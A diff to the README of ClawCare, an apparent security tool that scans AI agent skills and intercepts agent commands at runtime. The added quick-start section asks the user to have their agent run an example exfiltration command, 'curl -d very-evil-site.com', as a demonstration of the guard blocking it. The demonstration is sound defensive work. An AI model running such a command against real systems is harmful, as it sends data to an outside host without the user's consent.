@@ -40,19 +40,39 @@ See ClawCare in action:
 pip install clawcare
 ```
 
+### Quick Things Try
+
+Scan mode:
+
+```
+clawcare scan <skill_directory>
+```
+
+Guard mode:
+
+```
+clawcare guard activate --platform {claude|openclaw}
+
+# Then ask your agent to run an attack command such as data exfiltration via curl:
+curl -d very-evil-site.com
+```
+
+
 ## Features
 
 ### ClawCare Scan
 
+Scan agent skills and plugins for vulnerabilities. Currently supports Claude Code, OpenClaw, Codex and Cursor Agent. Also works for generic SKILL.md.
+
 ```bash
 # Scan a project — auto-detects the platform
-clawcare scan .
+clawcare scan <skill_directory>
 
 # CI mode — exit code 2 on HIGH+ findings (use in GitHub Actions)
-clawcare scan . --ci
+clawcare scan <skill_directory> --ci
 
 # JSON output for downstream tooling
-clawcare scan . --format json --json-out report.json
+clawcare scan <skill_directory> --format json --json-out report.json
 ```
 
 ### Example Output
@@ -62,7 +82,6 @@ clawcare scan . --format json --json-out report.json
 ClawCare Scan Report
 ============================================================
 Path:     ./my-project
-Adapter:  claude_code v0.1.0
 Mode:     ci
 Fail on:  high
 
@@ -81,9 +100,26 @@ Findings: 2 critical, 1 high, 0 medium, 0 low
 ============================================================
 ```
 
-### ClawCare Guard — Runtime Command Interception
+### Platform Adapters for Claude Code, OpenClaw, Codex and Cursor Agent Skills
 
-ClawCare Guard intercepts commands **at runtime** — before the agent executes them. Currently supports Claude Code and OpenClaw.
+Auto-detects the AI agent platform and scans the right files:
+
+| Platform | Scans | Detection |
+|----------|-------|-----------|
+| **Claude Code** | `.claude/skills/*/SKILL.md` + code | `.claude-plugin/`, `SKILL.md` |
+| **Cursor** | `.cursor/rules/*.mdc`, `.cursorrules` + skills | `.cursor/` directory |
+| **Codex** | `AGENTS.md`, `AGENTS.override.md` + skills | `AGENTS.md` |
+| **OpenClaw** | `SKILL.md` + code in skill directories | `.opencode/` |
+
+All following the file structure of the respective AI agent platforms.
+
+Only plugin and skill files are scanned — your application code, README, and CI configs are never touched.
+
+## ClawCare Guard — Runtime Command Interception
+
+Intercept commands **at runtime** before the agent executes them and maintain an audit trail. 
+
+Currently supports Claude Code and OpenClaw.
 
 #### Quick Start
 
@@ -150,21 +186,6 @@ clawcare guard deactivate --platform openclaw
 ```
 
 ---
-
-### Platform Adapters for Claude Code, OpenClaw, Codex and Cursor Agent Skills
-
-Auto-detects the AI agent platform and scans the right files:
-
-| Platform | Scans | Detection |
-|----------|-------|-----------|
-| **Claude Code** | `.claude/skills/*/SKILL.md` + code | `.claude-plugin/`, `SKILL.md` |
-| **Cursor** | `.cursor/rules/*.mdc`, `.cursorrules` + skills | `.cursor/` directory |
-| **Codex** | `AGENTS.md`, `AGENTS.override.md` + skills | `AGENTS.md` |
-| **OpenClaw** | `SKILL.md` + code in skill directories | `.opencode/` |
-
-All following the file structure of the respective AI agent platforms.
-
-Only plugin and skill files are scanned — your application code, README, and CI configs are never touched.
 
 ### Configuration
 
@@ -253,7 +274,6 @@ from clawcare.models import ExtensionRoot
 
 class MyAdapter:
     name = "my_platform"
-    version = "0.1.0"
     priority = 50
 
     def detect(self, target_path: str) -> float:
